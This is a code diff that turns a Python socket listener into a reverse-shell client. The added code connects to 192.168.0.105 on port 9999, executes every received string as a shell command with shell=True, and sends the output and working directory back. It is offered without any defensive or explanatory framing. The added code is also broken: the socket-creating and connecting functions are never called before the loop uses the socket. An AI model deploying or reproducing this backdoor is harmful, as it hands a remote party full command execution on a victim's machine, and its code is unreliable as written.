@@ -1,10 +1,10 @@
 import socket
-import sys
-from typing import BinaryIO
-host = "103.104.214.235"
+import  os
+import subprocess
+
+server = "192.168.0.105"
 port = 9999
 
-#function for creating a socket 
 def create_socket():
     global s
     try:
@@ -12,25 +12,17 @@ def create_socket():
     except:
         print("Error: " + str(socket.error))
 
-#function for binding the socket and port & host address / listening to connection
-def bind_socket():
-    global s
-    try:
-        print("Binding the port {} and the host {} with the socket".format(str(port),host))
-        s.bind((host,port))
-        s.listen(5)
-    except:
-        print("Error: " + str(socket.error) + "\n" + "Tryng again to bind!")
-        bind_socket()
+def connect_socket():
+    print("connecting socket with ip: {} at port: {}".format(server,str(port)))
+    s.connect((server,port))
 
-#function for establishing a connection with client (socket must be listening )
-def accept_connection ():
-    print("Accepting the connection!")
-    connection,address  = s.accept()
-    print("Connection established! IP: {} Port: {}".format(address[0],str(address[1])))
-
-def main():
-    create_socket()
-    bind_socket()
-    accept_connection()
-main()
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == "cd":
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0 and (not(data[:2].decode("utf-8") == "cd")):
+        client_response = subprocess.Popen(data.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        output_byte = client_response.stdout.read() + client_response.stderr.read()
+        output_str = output_byte.decode("utf-8")
+        currentWD = os.getcwd()
+        s.send((output_str + currentWD).encode())
